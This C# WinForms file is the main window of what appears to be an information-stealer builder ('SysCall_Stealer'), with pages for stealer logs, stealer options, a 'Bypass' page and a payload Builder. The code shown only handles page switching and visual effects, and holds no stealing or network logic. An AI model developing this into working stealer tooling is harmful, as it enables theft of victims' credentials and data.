using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Reflection.Emit;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace SysCall_Stealer
{
    public partial class syscallmain : Form
    {
        private FollowForm1Blur blurForm;

        private SettingsPage settingsPage;
        private BypassPage bypassPage;
        private Logs logsPage;
        private Options optionsPage;
        private Builder builderPage;


        private void addUserControl(UserControl userControl)
        {
            // Hide all other controls instead of clearing
            foreach (Control ctrl in panelContainer.Controls)
                ctrl.Visible = false;

            // Add if not already inside the container
            if (!panelContainer.Controls.Contains(userControl))
            {
                userControl.Dock = DockStyle.Fill;
                panelContainer.Controls.Add(userControl);
            }

            // Show and bring to front
            userControl.Visible = true;
            userControl.BringToFront();

            // Optional animation logic
            var panelsToAnimate = new[] { "guna2Panel3", "guna2Panel2", "guna2Panel4" };

            foreach (string panelName in panelsToAnimate)
            {
                Control panel = userControl.Controls.Find(panelName, true).FirstOrDefault();
                if (panel != null)
                    panel.Visible = false;
            }

            Task.Run(async () =>
            {
                int delay = 0;
                foreach (string panelName in panelsToAnimate)
                {
                    await Task.Delay(delay);
                    this.Invoke(new Action(() =>
                    {
                        Control panel = userControl.Controls.Find(panelName, true).FirstOrDefault();
                        if (panel != null)
                        {
                            panel.Visible = true;
                            AnimateFadeInControl(panel);
                        }
                    }));
                    delay += 80;
                }
            });
        }


        private async void AnimateFadeInControl(Control control)
        {
            control.Visible = true;

            int startY = control.Location.Y + 30;
            int endY = control.Location.Y;

            for (int i = 0; i <= 20; i++)
            {
                double progress = i / 20.0;
                double eased = 1 - Math.Pow(1 - progress, 3);

                int currentY = (int)(startY + (endY - startY) * eased);
                control.Location = new Point(control.Location.X, currentY);

                await Task.Delay(16);
            }

            control.Location = new Point(control.Location.X, endY);
        }
        private void SetControlOpacity(Control control, double opacity)
        {
            if (opacity < 0 || opacity > 1)
                opacity = 1;

            int alpha = (int)(255 * opacity);

            foreach (Control ctrl in control.Controls)
            {
                if (ctrl.BackColor != Color.Transparent)
                {
                    ctrl.BackColor = Color.FromArgb(alpha, ctrl.BackColor);
                }
                ctrl.ForeColor = Color.FromArgb(alpha, ctrl.ForeColor);
            }
        }
        private void InitializeBlurEffect()
        {
            blurForm = new FollowForm1Blur(this);
            blurForm.StartFollowing(this);
        }

        public syscallmain()
        {
            InitializeComponent();


            this.Opacity = 0;

            this.DoubleBuffered = true;
            InitializeBlurEffect();

          
            settingsPage = new SettingsPage();
            bypassPage = new BypassPage();
            logsPage = new Logs();
            optionsPage = new Options();
            builderPage = new Builder();

            // Link the instances - ADD THIS LINE
            optionsPage.SetLogsInstance(logsPage);


        }
        protected override void OnLoad(EventArgs e)
        {
            base.OnLoad(e);

          
            FadeIn();
        }

        private async void FadeIn()
        {
            for (int i = 0; i <= 92; i++)
            {
                this.Opacity = i / 100.0;
                await Task.Delay(15); 
            }
            this.Opacity = 0.92; 
        }
        private void syscallmain_Load(object sender, EventArgs e)
        {

            guna2ShadowForm1.SetShadowForm(this);
      
        }

        protected override void OnFormClosed(FormClosedEventArgs e)
        {
            blurForm?.Close();
            base.OnFormClosed(e);
        }
        private void syscallmain_Paint(object sender, PaintEventArgs e)
        {
            Color borderColor = Color.FromArgb(40, 56, 78);

            // 1px border
            using (Pen pen = new Pen(borderColor, 1))
            {
                e.Graphics.SmoothingMode = System.Drawing.Drawing2D.SmoothingMode.HighQuality;

                Rectangle rect = new Rectangle(
                    0,
                    0,
                    this.ClientSize.Width - 1,
                    this.ClientSize.Height - 1
                );

                e.Graphics.DrawRectangle(pen, rect);
            }
        }

        private void label14_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button1_Click(object sender, EventArgs e)
        {
       
        }

        private void guna2Button2_Click(object sender, EventArgs e)
        {
       
        }

        private void guna2Button4_Click(object sender, EventArgs e)
        {
            
        }

        private void guna2Button3_Click(object sender, EventArgs e)
        {
     
        }

        private void guna2Button3_Click_1(object sender, EventArgs e)
        {
            label18.Text = "Stealer Logs";
            addUserControl(logsPage);
        }

        private void guna2Button5_Click(object sender, EventArgs e)
        {

        }

        private void guna2Button7_Click(object sender, EventArgs e)
        {
            label18.Text = "Stealer Options";
            addUserControl(optionsPage);
        }

        private void guna2Button6_Click(object sender, EventArgs e)
        {
            label18.Text = "Builder";
            addUserControl(builderPage);
        }
    }
}